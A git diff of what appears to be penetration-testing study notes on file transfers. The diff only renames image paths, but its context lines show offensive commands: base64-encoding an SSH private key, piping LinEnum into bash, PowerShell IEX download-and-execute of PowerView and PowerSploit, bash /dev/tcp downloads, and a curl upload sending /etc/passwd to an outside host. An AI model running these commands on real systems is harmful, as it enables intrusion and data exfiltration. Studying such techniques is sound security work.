@@ -22,7 +22,7 @@ cat id_rsa |base64 -w 0;echo
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>cmd.exe has a maximum string length of 8,191 &#x26; powershell.exe has a maximum string length 2,147,483,647 characters</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>cmd.exe has a maximum string length of 8,191 &#x26; powershell.exe has a maximum string length 2,147,483,647 characters</p></figcaption></figure>
 
 ## Web Downloads with Wget & cURL
 
@@ -44,7 +44,7 @@ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Download a File Using cURL**
 
@@ -54,7 +54,7 @@ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/mas
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Fileless Download with cURL**
 
@@ -64,7 +64,7 @@ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | ba
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Download with Bash (/dev/tcp)
 
@@ -76,7 +76,7 @@ exec 3<>/dev/tcp/10.10.10.32/80
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **HTTP GET Request**
 
@@ -86,7 +86,7 @@ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Print the Response**
 
@@ -96,7 +96,7 @@ cat <&3
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## PowerShell Web Downloads
 
@@ -108,7 +108,7 @@ cat <&3
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **DownloadString - Fileless Method**
 
@@ -118,7 +118,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Invoke-WebRequest**
 
@@ -128,11 +128,11 @@ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption><p>You can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption><p>You can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name</p></figcaption></figure>
 
 ### **Common Errors with PowerShell**
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption><p>There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption><p>There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing</p></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```
@@ -140,7 +140,7 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```powershell-session
@@ -148,7 +148,7 @@ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption><p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption><p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command</p></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```
@@ -281,7 +281,7 @@ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/e
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## PowerShell Web Uploads
 
